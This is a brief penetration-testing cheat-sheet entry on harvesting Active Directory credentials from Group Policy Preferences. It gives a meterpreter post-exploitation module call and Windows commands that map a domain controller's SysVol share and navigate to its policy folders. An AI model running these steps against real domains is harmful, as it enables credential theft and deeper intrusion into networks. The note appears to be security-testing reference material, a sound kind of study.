# active directory credentials

# from meterpreter:

run post/windows/gather/credentials/gpp


# from windows shell

# Active Directory policies are stored in a special UNC path:

# from windows shell

%USERDOMAIN%\Policies

# But you cannot access UNC paths via cmd, so you have to use the Sysvol share you can find
# on a domain controller:

%LOGONSERVER%\Sysvol

net use X: \\DC01\SysVol
X:
cd %USERDOMAIN%\Policies
